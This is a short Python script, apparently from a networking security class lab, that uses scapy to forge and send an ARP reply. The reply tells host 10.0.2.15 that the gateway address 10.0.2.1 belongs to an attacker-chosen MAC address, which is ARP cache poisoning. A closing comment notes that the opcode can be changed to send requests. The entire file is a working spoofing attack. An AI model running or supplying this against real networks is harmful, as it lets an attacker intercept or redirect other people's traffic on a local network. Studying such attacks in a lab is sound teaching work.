#!/usr/bin/python3

from scapy.all import *

arp = ARP(hwsrc="08:00:27:bb:77:45", 
	 psrc= "10.0.2.1",
	hwdst= "08:00:27:fd:d5:27" , 
	pdst="10.0.2.15" )
arp.op = 2 #reply
ether = Ether(src="08:00:27:bb:77:45" , 
	dst= "08:00:27:fd:d5:27")

packet = ether/arp

sendp(packet)

""" You can make required changes in the code 
for example : arp.op =1 means its a ARP request.

We have discussed all the variants in the class."""
